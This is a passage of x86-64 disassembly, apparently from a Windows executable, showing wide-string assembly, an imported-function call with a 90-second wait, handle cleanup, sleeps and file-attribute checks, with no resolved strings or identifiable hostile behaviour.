   2dc492ce3:	48 89 bc 24 b0 01 00 	mov    %rdi,0x1b0(%rsp)
   2dc492cea:	00 
   2dc492ceb:	4c 8d a4 24 b0 01 00 	lea    0x1b0(%rsp),%r12
   2dc492cf2:	00 
   2dc492cf3:	48 89 84 24 00 03 00 	mov    %rax,0x300(%rsp)
   2dc492cfa:	00 
   2dc492cfb:	48 8b 84 24 70 01 00 	mov    0x170(%rsp),%rax
   2dc492d02:	00 
   2dc492d03:	48 89 84 24 18 03 00 	mov    %rax,0x318(%rsp)
   2dc492d0a:	00 
   2dc492d0b:	e8 e8 1f 01 00       	call   0x2dc4a4cf8
   2dc492d10:	48 89 f2             	mov    %rsi,%rdx
   2dc492d13:	4c 89 e1             	mov    %r12,%rcx
   2dc492d16:	4c 8d 04 46          	lea    (%rsi,%rax,2),%r8
   2dc492d1a:	e8 61 ea ff ff       	call   0x2dc491780
   2dc492d1f:	48 8d 0d a0 54 02 00 	lea    0x254a0(%rip),%rcx        # 0x2dc4b81c6
   2dc492d26:	e8 cd 1f 01 00       	call   0x2dc4a4cf8
   2dc492d2b:	45 31 c0             	xor    %r8d,%r8d
   2dc492d2e:	31 d2                	xor    %edx,%edx
   2dc492d30:	4c 89 e1             	mov    %r12,%rcx
   2dc492d33:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   2dc492d38:	4c 8d 0d 87 54 02 00 	lea    0x25487(%rip),%r9        # 0x2dc4b81c6
   2dc492d3f:	e8 4c ea 01 00       	call   0x2dc4b1790
   2dc492d44:	48 8d b4 24 e0 01 00 	lea    0x1e0(%rsp),%rsi
   2dc492d4b:	00 
   2dc492d4c:	49 89 c1             	mov    %rax,%r9
   2dc492d4f:	48 89 b4 24 d0 01 00 	mov    %rsi,0x1d0(%rsp)
   2dc492d56:	00 
   2dc492d57:	48 8b 00             	mov    (%rax),%rax
   2dc492d5a:	49 8d 51 10          	lea    0x10(%r9),%rdx
   2dc492d5e:	49 8b 49 08          	mov    0x8(%r9),%rcx
   2dc492d62:	48 39 d0             	cmp    %rdx,%rax
   2dc492d65:	0f 84 44 07 00 00    	je     0x2dc4934af
   2dc492d6b:	48 89 84 24 d0 01 00 	mov    %rax,0x1d0(%rsp)
   2dc492d72:	00 
   2dc492d73:	49 8b 41 10          	mov    0x10(%r9),%rax
   2dc492d77:	48 89 84 24 e0 01 00 	mov    %rax,0x1e0(%rsp)
   2dc492d7e:	00 
   2dc492d7f:	45 31 db             	xor    %r11d,%r11d
   2dc492d82:	49 89 11             	mov    %rdx,(%r9)
   2dc492d85:	49 c7 41 08 00 00 00 	movq   $0x0,0x8(%r9)
   2dc492d8c:	00 
   2dc492d8d:	66 45 89 59 10       	mov    %r11w,0x10(%r9)
   2dc492d92:	48 89 8c 24 d8 01 00 	mov    %rcx,0x1d8(%rsp)
   2dc492d99:	00 
   2dc492d9a:	48 89 d9             	mov    %rbx,%rcx
   2dc492d9d:	e8 56 1f 01 00       	call   0x2dc4a4cf8
   2dc492da2:	49 89 c0             	mov    %rax,%r8
   2dc492da5:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492dac:	ff ff 1f 
   2dc492daf:	48 2b 84 24 d8 01 00 	sub    0x1d8(%rsp),%rax
   2dc492db6:	00 
   2dc492db7:	4c 39 c0             	cmp    %r8,%rax
   2dc492dba:	48 8d 84 24 d0 01 00 	lea    0x1d0(%rsp),%rax
   2dc492dc1:	00 
   2dc492dc2:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   2dc492dc9:	00 
   2dc492dca:	0f 82 aa 08 00 00    	jb     0x2dc49367a
   2dc492dd0:	48 89 da             	mov    %rbx,%rdx
   2dc492dd3:	48 89 c1             	mov    %rax,%rcx
   2dc492dd6:	e8 c5 09 02 00       	call   0x2dc4b37a0
   2dc492ddb:	49 89 c1             	mov    %rax,%r9
   2dc492dde:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   2dc492de5:	00 
   2dc492de6:	49 8d 51 10          	lea    0x10(%r9),%rdx
   2dc492dea:	49 8b 49 08          	mov    0x8(%r9),%rcx
   2dc492dee:	48 89 84 24 f0 01 00 	mov    %rax,0x1f0(%rsp)
   2dc492df5:	00 
   2dc492df6:	49 8b 01             	mov    (%r9),%rax
   2dc492df9:	48 39 d0             	cmp    %rdx,%rax
   2dc492dfc:	0f 84 e3 06 00 00    	je     0x2dc4934e5
   2dc492e02:	48 89 84 24 f0 01 00 	mov    %rax,0x1f0(%rsp)
   2dc492e09:	00 
   2dc492e0a:	49 8b 41 10          	mov    0x10(%r9),%rax
   2dc492e0e:	48 89 84 24 00 02 00 	mov    %rax,0x200(%rsp)
   2dc492e15:	00 
   2dc492e16:	48 89 8c 24 f8 01 00 	mov    %rcx,0x1f8(%rsp)
   2dc492e1d:	00 
   2dc492e1e:	45 31 d2             	xor    %r10d,%r10d
   2dc492e21:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492e28:	ff ff 1f 
   2dc492e2b:	49 c7 41 08 00 00 00 	movq   $0x0,0x8(%r9)
   2dc492e32:	00 
   2dc492e33:	4c 8b 84 24 58 01 00 	mov    0x158(%rsp),%r8
   2dc492e3a:	00 
   2dc492e3b:	48 2b 84 24 f8 01 00 	sub    0x1f8(%rsp),%rax
   2dc492e42:	00 
   2dc492e43:	49 89 11             	mov    %rdx,(%r9)
   2dc492e46:	66 45 89 51 10       	mov    %r10w,0x10(%r9)
   2dc492e4b:	48 8b 94 24 50 01 00 	mov    0x150(%rsp),%rdx
   2dc492e52:	00 
   2dc492e53:	4c 39 c0             	cmp    %r8,%rax
   2dc492e56:	0f 82 fa 07 00 00    	jb     0x2dc493656
   2dc492e5c:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   2dc492e63:	00 
   2dc492e64:	e8 37 09 02 00       	call   0x2dc4b37a0
   2dc492e69:	49 89 c1             	mov    %rax,%r9
   2dc492e6c:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   2dc492e73:	00 
   2dc492e74:	49 8d 51 10          	lea    0x10(%r9),%rdx
   2dc492e78:	49 8b 49 08          	mov    0x8(%r9),%rcx
   2dc492e7c:	48 89 84 24 10 02 00 	mov    %rax,0x210(%rsp)
   2dc492e83:	00 
   2dc492e84:	49 8b 01             	mov    (%r9),%rax
   2dc492e87:	48 39 d0             	cmp    %rdx,%rax
   2dc492e8a:	0f 84 e3 06 00 00    	je     0x2dc493573
   2dc492e90:	48 89 84 24 10 02 00 	mov    %rax,0x210(%rsp)
   2dc492e97:	00 
   2dc492e98:	49 8b 41 10          	mov    0x10(%r9),%rax
   2dc492e9c:	48 89 84 24 20 02 00 	mov    %rax,0x220(%rsp)
   2dc492ea3:	00 
   2dc492ea4:	45 31 c0             	xor    %r8d,%r8d
   2dc492ea7:	48 89 8c 24 18 02 00 	mov    %rcx,0x218(%rsp)
   2dc492eae:	00 
   2dc492eaf:	48 89 d9             	mov    %rbx,%rcx
   2dc492eb2:	66 45 89 41 10       	mov    %r8w,0x10(%r9)
   2dc492eb7:	49 89 11             	mov    %rdx,(%r9)
   2dc492eba:	49 c7 41 08 00 00 00 	movq   $0x0,0x8(%r9)
   2dc492ec1:	00 
   2dc492ec2:	e8 31 1e 01 00       	call   0x2dc4a4cf8
   2dc492ec7:	49 89 c0             	mov    %rax,%r8
   2dc492eca:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492ed1:	ff ff 1f 
   2dc492ed4:	48 2b 84 24 18 02 00 	sub    0x218(%rsp),%rax
   2dc492edb:	00 
   2dc492edc:	4c 39 c0             	cmp    %r8,%rax
   2dc492edf:	0f 82 65 07 00 00    	jb     0x2dc49364a
   2dc492ee5:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   2dc492eec:	00 
   2dc492eed:	48 89 da             	mov    %rbx,%rdx
   2dc492ef0:	e8 ab 08 02 00       	call   0x2dc4b37a0
   2dc492ef5:	48 89 c3             	mov    %rax,%rbx
   2dc492ef8:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   2dc492eff:	00 
   2dc492f00:	48 8d 53 10          	lea    0x10(%rbx),%rdx
   2dc492f04:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   2dc492f08:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   2dc492f0f:	00 
   2dc492f10:	48 8b 03             	mov    (%rbx),%rax
   2dc492f13:	48 39 d0             	cmp    %rdx,%rax
   2dc492f16:	0f 84 2c 06 00 00    	je     0x2dc493548
   2dc492f1c:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   2dc492f23:	00 
   2dc492f24:	48 8b 43 10          	mov    0x10(%rbx),%rax
   2dc492f28:	48 89 84 24 40 02 00 	mov    %rax,0x240(%rsp)
   2dc492f2f:	00 
   2dc492f30:	48 89 8c 24 38 02 00 	mov    %rcx,0x238(%rsp)
   2dc492f37:	00 
   2dc492f38:	31 c9                	xor    %ecx,%ecx
   2dc492f3a:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492f41:	ff ff 1f 
   2dc492f44:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   2dc492f4b:	00 
   2dc492f4c:	4c 8b 84 24 38 01 00 	mov    0x138(%rsp),%r8
   2dc492f53:	00 
   2dc492f54:	48 2b 84 24 38 02 00 	sub    0x238(%rsp),%rax
   2dc492f5b:	00 
   2dc492f5c:	48 89 13             	mov    %rdx,(%rbx)
   2dc492f5f:	66 89 4b 10          	mov    %cx,0x10(%rbx)
   2dc492f63:	48 8b 94 24 30 01 00 	mov    0x130(%rsp),%rdx
   2dc492f6a:	00 
   2dc492f6b:	4c 39 c0             	cmp    %r8,%rax
   2dc492f6e:	0f 82 fa 06 00 00    	jb     0x2dc49366e
   2dc492f74:	48 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%rcx
   2dc492f7b:	00 
   2dc492f7c:	e8 1f 08 02 00       	call   0x2dc4b37a0
   2dc492f81:	48 89 c3             	mov    %rax,%rbx
   2dc492f84:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   2dc492f89:	48 8d 53 10          	lea    0x10(%rbx),%rdx
   2dc492f8d:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   2dc492f91:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   2dc492f98:	00 
   2dc492f99:	48 8b 03             	mov    (%rbx),%rax
   2dc492f9c:	48 39 d0             	cmp    %rdx,%rax
   2dc492f9f:	0f 84 7b 05 00 00    	je     0x2dc493520
   2dc492fa5:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   2dc492fac:	00 
   2dc492fad:	48 8b 43 10          	mov    0x10(%rbx),%rax
   2dc492fb1:	48 89 84 24 60 02 00 	mov    %rax,0x260(%rsp)
   2dc492fb8:	00 
   2dc492fb9:	48 89 8c 24 58 02 00 	mov    %rcx,0x258(%rsp)
   2dc492fc0:	00 
   2dc492fc1:	48 8d 0d 9a 51 02 00 	lea    0x2519a(%rip),%rcx        # 0x2dc4b8162
   2dc492fc8:	48 89 13             	mov    %rdx,(%rbx)
   2dc492fcb:	31 d2                	xor    %edx,%edx
   2dc492fcd:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   2dc492fd4:	00 
   2dc492fd5:	66 89 53 10          	mov    %dx,0x10(%rbx)
   2dc492fd9:	e8 1a 1d 01 00       	call   0x2dc4a4cf8
   2dc492fde:	49 89 c0             	mov    %rax,%r8
   2dc492fe1:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492fe8:	ff ff 1f 
   2dc492feb:	48 2b 84 24 58 02 00 	sub    0x258(%rsp),%rax
   2dc492ff2:	00 
   2dc492ff3:	4c 39 c0             	cmp    %r8,%rax
   2dc492ff6:	0f 82 66 06 00 00    	jb     0x2dc493662
   2dc492ffc:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   2dc493001:	48 8d 15 5a 51 02 00 	lea    0x2515a(%rip),%rdx        # 0x2dc4b8162
   2dc493008:	e8 93 07 02 00       	call   0x2dc4b37a0
   2dc49300d:	48 89 c3             	mov    %rax,%rbx
   2dc493010:	4c 89 b4 24 70 02 00 	mov    %r14,0x270(%rsp)
   2dc493017:	00 
   2dc493018:	48 8b 00             	mov    (%rax),%rax
   2dc49301b:	4c 8d 63 10          	lea    0x10(%rbx),%r12
   2dc49301f:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   2dc493023:	4c 39 e0             	cmp    %r12,%rax
   2dc493026:	0f 84 6a 04 00 00    	je     0x2dc493496
   2dc49302c:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   2dc493033:	00 
   2dc493034:	48 8b 43 10          	mov    0x10(%rbx),%rax
   2dc493038:	48 89 84 24 80 02 00 	mov    %rax,0x280(%rsp)
   2dc49303f:	00 
   2dc493040:	48 89 94 24 78 02 00 	mov    %rdx,0x278(%rsp)
   2dc493047:	00 
   2dc493048:	31 c0                	xor    %eax,%eax
   2dc49304a:	4c 89 23             	mov    %r12,(%rbx)
   2dc49304d:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   2dc493054:	00 
   2dc493055:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   2dc49305c:	00 
   2dc49305d:	66 89 43 10          	mov    %ax,0x10(%rbx)
   2dc493061:	48 89 8c 24 20 03 00 	mov    %rcx,0x320(%rsp)
   2dc493068:	00 
   2dc493069:	4c 39 f1             	cmp    %r14,%rcx
   2dc49306c:	74 12                	je     0x2dc493080
   2dc49306e:	48 8b 84 24 80 02 00 	mov    0x280(%rsp),%rax
   2dc493075:	00 
   2dc493076:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc49307b:	e8 00 2c 02 00       	call   0x2dc4b5c80
   2dc493080:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   2dc493087:	00 
   2dc493088:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   2dc49308d:	48 39 c1             	cmp    %rax,%rcx
   2dc493090:	74 12                	je     0x2dc4930a4
   2dc493092:	48 8b 84 24 60 02 00 	mov    0x260(%rsp),%rax
   2dc493099:	00 
   2dc49309a:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc49309f:	e8 dc 2b 02 00       	call   0x2dc4b5c80
   2dc4930a4:	48 8b 8c 24 30 02 00 	mov    0x230(%rsp),%rcx
   2dc4930ab:	00 
   2dc4930ac:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   2dc4930b3:	00 
   2dc4930b4:	48 39 c1             	cmp    %rax,%rcx
   2dc4930b7:	74 12                	je     0x2dc4930cb
   2dc4930b9:	48 8b 84 24 40 02 00 	mov    0x240(%rsp),%rax
   2dc4930c0:	00 
   2dc4930c1:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc4930c6:	e8 b5 2b 02 00       	call   0x2dc4b5c80
   2dc4930cb:	48 8b 8c 24 10 02 00 	mov    0x210(%rsp),%rcx
   2dc4930d2:	00 
   2dc4930d3:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   2dc4930da:	00 
   2dc4930db:	48 39 c1             	cmp    %rax,%rcx
   2dc4930de:	74 12                	je     0x2dc4930f2
   2dc4930e0:	48 8b 84 24 20 02 00 	mov    0x220(%rsp),%rax
   2dc4930e7:	00 
   2dc4930e8:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc4930ed:	e8 8e 2b 02 00       	call   0x2dc4b5c80
   2dc4930f2:	48 8b 8c 24 f0 01 00 	mov    0x1f0(%rsp),%rcx
   2dc4930f9:	00 
   2dc4930fa:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   2dc493101:	00 
   2dc493102:	48 39 c1             	cmp    %rax,%rcx
   2dc493105:	74 12                	je     0x2dc493119
   2dc493107:	48 8b 84 24 00 02 00 	mov    0x200(%rsp),%rax
   2dc49310e:	00 
   2dc49310f:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc493114:	e8 67 2b 02 00       	call   0x2dc4b5c80
   2dc493119:	48 8b 8c 24 d0 01 00 	mov    0x1d0(%rsp),%rcx
   2dc493120:	00 
   2dc493121:	48 39 f1             	cmp    %rsi,%rcx
   2dc493124:	74 12                	je     0x2dc493138
   2dc493126:	48 8b 84 24 e0 01 00 	mov    0x1e0(%rsp),%rax
   2dc49312d:	00 
   2dc49312e:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc493133:	e8 48 2b 02 00       	call   0x2dc4b5c80
   2dc493138:	48 8b 8c 24 b0 01 00 	mov    0x1b0(%rsp),%rcx
   2dc49313f:	00 
   2dc493140:	48 39 f9             	cmp    %rdi,%rcx
   2dc493143:	74 12                	je     0x2dc493157
   2dc493145:	48 8b 84 24 c0 01 00 	mov    0x1c0(%rsp),%rax
   2dc49314c:	00 
   2dc49314d:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc493152:	e8 29 2b 02 00       	call   0x2dc4b5c80
   2dc493157:	48 8b 84 24 30 01 00 	mov    0x130(%rsp),%rax
   2dc49315e:	00 
   2dc49315f:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   2dc493164:	c7 84 24 30 03 00 00 	movl   $0x0,0x330(%rsp)
   2dc49316b:	00 00 00 00 
   2dc49316f:	48 89 84 24 28 03 00 	mov    %rax,0x328(%rsp)
   2dc493176:	00 
   2dc493177:	ff 15 c3 36 03 00    	call   *0x336c3(%rip)        # 0x2dc4c6840
   2dc49317d:	85 c0                	test   %eax,%eax
   2dc49317f:	0f 84 10 01 00 00    	je     0x2dc493295
   2dc493185:	48 8b 8c 24 68 03 00 	mov    0x368(%rsp),%rcx
   2dc49318c:	00 
   2dc49318d:	48 89 8c 24 f0 00 00 	mov    %rcx,0xf0(%rsp)
   2dc493194:	00 
   2dc493195:	ba 90 5f 01 00       	mov    $0x15f90,%edx
   2dc49319a:	ff 15 28 34 03 00    	call   *0x33428(%rip)        # 0x2dc4c65c8
   2dc4931a0:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   2dc4931a7:	00 
   2dc4931a8:	48 8b 8c 24 f0 00 00 	mov    0xf0(%rsp),%rcx
   2dc4931af:	00 
   2dc4931b0:	48 89 d8             	mov    %rbx,%rax
   2dc4931b3:	ff d0                	call   *%rax
   2dc4931b5:	48 8b 8c 24 f8 00 00 	mov    0xf8(%rsp),%rcx
   2dc4931bc:	00 
   2dc4931bd:	48 89 d8             	mov    %rbx,%rax
   2dc4931c0:	ff d0                	call   *%rax
   2dc4931c2:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   2dc4931c9:	00 
   2dc4931ca:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   2dc4931cf:	ff d6                	call   *%rsi
   2dc4931d1:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   2dc4931d6:	4c 8d 05 07 50 02 00 	lea    0x25007(%rip),%r8        # 0x2dc4b81e4
   2dc4931dd:	4c 89 e9             	mov    %r13,%rcx
   2dc4931e0:	48 89 da             	mov    %rbx,%rdx
   2dc4931e3:	e8 b8 e6 ff ff       	call   0x2dc4918a0
   2dc4931e8:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   2dc4931ed:	4c 8d 05 00 50 02 00 	lea    0x25000(%rip),%r8        # 0x2dc4b81f4
   2dc4931f4:	48 89 da             	mov    %rbx,%rdx
   2dc4931f7:	e8 a4 e6 ff ff       	call   0x2dc4918a0
   2dc4931fc:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   2dc493203:	00 
   2dc493204:	48 85 c9             	test   %rcx,%rcx
   2dc493207:	74 22                	je     0x2dc49322b
   2dc493209:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   2dc49320e:	ff d0                	call   *%rax
   2dc493210:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc493213:	74 16                	je     0x2dc49322b
   2dc493215:	a8 10                	test   $0x10,%al
   2dc493217:	75 12                	jne    0x2dc49322b
   2dc493219:	48 89 da             	mov    %rbx,%rdx
   2dc49321c:	4c 89 e9             	mov    %r13,%rcx
   2dc49321f:	e8 ec e5 ff ff       	call   0x2dc491810
   2dc493224:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   2dc493229:	ff d6                	call   *%rsi
   2dc49322b:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc493232:	00 
   2dc493233:	48 85 c9             	test   %rcx,%rcx
   2dc493236:	74 2c                	je     0x2dc493264
   2dc493238:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   2dc49323d:	ff d0                	call   *%rax
   2dc49323f:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc493242:	74 13                	je     0x2dc493257
   2dc493244:	a8 10                	test   $0x10,%al
   2dc493246:	75 0f                	jne    0x2dc493257
   2dc493248:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   2dc49324d:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   2dc493252:	e8 b9 e5 ff ff       	call   0x2dc491810
   2dc493257:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc49325e:	00 
   2dc49325f:	48 39 e9             	cmp    %rbp,%rcx
   2dc493262:	74 12                	je     0x2dc493276
   2dc493264:	48 8b 84 24 10 03 00 	mov    0x310(%rsp),%rax
   2dc49326b:	00 
   2dc49326c:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc493271:	e8 0a 2a 02 00       	call   0x2dc4b5c80
   2dc493276:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   2dc49327d:	00 
   2dc49327e:	4c 39 f1             	cmp    %r14,%rcx
   2dc493281:	74 12                	je     0x2dc493295
   2dc493283:	48 8b 84 24 80 02 00 	mov    0x280(%rsp),%rax
   2dc49328a:	00 
   2dc49328b:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc493290:	e8 eb 29 02 00       	call   0x2dc4b5c80
   2dc493295:	48 8b 8c 24 90 01 00 	mov    0x190(%rsp),%rcx
   2dc49329c:	00 
   2dc49329d:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   2dc4932a4:	00 
   2dc4932a5:	48 39 c1             	cmp    %rax,%rcx
   2dc4932a8:	74 12                	je     0x2dc4932bc
   2dc4932aa:	48 8b 84 24 a0 01 00 	mov    0x1a0(%rsp),%rax
   2dc4932b1:	00 
   2dc4932b2:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc4932b7:	e8 c4 29 02 00       	call   0x2dc4b5c80
   2dc4932bc:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   2dc4932c3:	00 
   2dc4932c4:	48 8d 84 24 80 01 00 	lea    0x180(%rsp),%rax
   2dc4932cb:	00 
   2dc4932cc:	48 39 c1             	cmp    %rax,%rcx
   2dc4932cf:	0f 84 3b f1 ff ff    	je     0x2dc492410
   2dc4932d5:	48 8b 84 24 80 01 00 	mov    0x180(%rsp),%rax
   2dc4932dc:	00 
   2dc4932dd:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc4932e2:	e8 99 29 02 00       	call   0x2dc4b5c80
   2dc4932e7:	e9 24 f1 ff ff       	jmp    0x2dc492410
   2dc4932ec:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc4932f0:	4c 89 e9             	mov    %r13,%rcx
   2dc4932f3:	ff 15 e7 31 03 00    	call   *0x331e7(%rip)        # 0x2dc4c64e0
   2dc4932f9:	e9 ca ec ff ff       	jmp    0x2dc491fc8
   2dc4932fe:	66 90                	xchg   %ax,%ax
   2dc493300:	48 8b 8c 24 f0 00 00 	mov    0xf0(%rsp),%rcx
   2dc493307:	00 
   2dc493308:	e9 88 fe ff ff       	jmp    0x2dc493195
   2dc49330d:	0f 1f 00             	nopl   (%rax)
   2dc493310:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   2dc493315:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   2dc49331c:	00 
   2dc49331d:	45 31 c0             	xor    %r8d,%r8d
   2dc493320:	31 d2                	xor    %edx,%edx
   2dc493322:	e8 69 e4 01 00       	call   0x2dc4b1790
   2dc493327:	e9 84 f4 ff ff       	jmp    0x2dc4927b0
   2dc49332c:	4d 85 c0             	test   %r8,%r8
   2dc49332f:	0f 84 56 01 00 00    	je     0x2dc49348b
   2dc493335:	49 83 f8 01          	cmp    $0x1,%r8
   2dc493339:	0f 84 41 01 00 00    	je     0x2dc493480
   2dc49333f:	4d 01 c0             	add    %r8,%r8
   2dc493342:	48 89 ea             	mov    %rbp,%rdx
   2dc493345:	e8 96 1a 01 00       	call   0x2dc4a4de0
   2dc49334a:	4c 8b 84 24 08 03 00 	mov    0x308(%rsp),%r8
   2dc493351:	00 
   2dc493352:	48 8b 84 24 70 01 00 	mov    0x170(%rsp),%rax
   2dc493359:	00 
   2dc49335a:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc493361:	00 
   2dc493362:	45 31 d2             	xor    %r10d,%r10d
   2dc493365:	4c 89 84 24 78 01 00 	mov    %r8,0x178(%rsp)
   2dc49336c:	00 
   2dc49336d:	66 46 89 14 40       	mov    %r10w,(%rax,%r8,2)
   2dc493372:	e9 2e f2 ff ff       	jmp    0x2dc4925a5
   2dc493377:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   2dc49337e:	00 
   2dc49337f:	4c 8d 44 12 02       	lea    0x2(%rdx,%rdx,1),%r8
   2dc493384:	48 89 fa             	mov    %rdi,%rdx
   2dc493387:	e8 54 1a 01 00       	call   0x2dc4a4de0
   2dc49338c:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   2dc493390:	e9 5e f4 ff ff       	jmp    0x2dc4927f3
   2dc493395:	48 83 f8 07          	cmp    $0x7,%rax
   2dc493399:	0f 86 eb f3 ff ff    	jbe    0x2dc49278a
   2dc49339f:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   2dc4933a6:	00 
   2dc4933a7:	48 39 d9             	cmp    %rbx,%rcx
   2dc4933aa:	0f 85 c9 f3 ff ff    	jne    0x2dc492779
   2dc4933b0:	e9 d5 f3 ff ff       	jmp    0x2dc49278a
   2dc4933b5:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc4933ba:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
   2dc4933c1:	00 
   2dc4933c2:	48 89 94 24 d8 00 00 	mov    %rdx,0xd8(%rsp)
   2dc4933c9:	00 
   2dc4933ca:	e8 11 1a 01 00       	call   0x2dc4a4de0
   2dc4933cf:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   2dc4933d3:	48 8b 94 24 d8 00 00 	mov    0xd8(%rsp),%rdx
   2dc4933da:	00 
   2dc4933db:	e9 e3 f6 ff ff       	jmp    0x2dc492ac3
   2dc4933e0:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc4933e5:	48 89 e9             	mov    %rbp,%rcx
   2dc4933e8:	48 89 94 24 b8 00 00 	mov    %rdx,0xb8(%rsp)
   2dc4933ef:	00 
   2dc4933f0:	e8 eb 19 01 00       	call   0x2dc4a4de0
   2dc4933f5:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   2dc4933f9:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   2dc493400:	00 
   2dc493401:	e9 26 f6 ff ff       	jmp    0x2dc492a2c
   2dc493406:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc49340b:	48 89 f1             	mov    %rsi,%rcx
   2dc49340e:	48 89 94 24 b8 00 00 	mov    %rdx,0xb8(%rsp)
   2dc493415:	00 
   2dc493416:	e8 c5 19 01 00       	call   0x2dc4a4de0
   2dc49341b:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   2dc49341f:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   2dc493426:	00 
   2dc493427:	e9 81 f5 ff ff       	jmp    0x2dc4929ad
   2dc49342c:	4c 8d 44 12 02       	lea    0x2(%rdx,%rdx,1),%r8
   2dc493431:	4c 89 f1             	mov    %r14,%rcx
   2dc493434:	4c 89 ea             	mov    %r13,%rdx
   2dc493437:	e8 a4 19 01 00       	call   0x2dc4a4de0
   2dc49343c:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc493440:	e9 e3 f4 ff ff       	jmp    0x2dc492928
   2dc493445:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   2dc49344a:	4c 8d 44 12 02       	lea    0x2(%rdx,%rdx,1),%r8
   2dc49344f:	4c 89 ea             	mov    %r13,%rdx
   2dc493452:	e8 89 19 01 00       	call   0x2dc4a4de0
   2dc493457:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc49345b:	e9 34 f4 ff ff       	jmp    0x2dc492894
   2dc493460:	48 89 84 24 70 01 00 	mov    %rax,0x170(%rsp)
   2dc493467:	00 
   2dc493468:	0f 11 84 24 78 01 00 	movups %xmm0,0x178(%rsp)
   2dc49346f:	00 
   2dc493470:	e9 5a f1 ff ff       	jmp    0x2dc4925cf
   2dc493475:	41 ba 07 00 00 00    	mov    $0x7,%r10d
   2dc49347b:	e9 01 f3 ff ff       	jmp    0x2dc492781
   2dc493480:	0f b7 84 24 10 03 00 	movzwl 0x310(%rsp),%eax
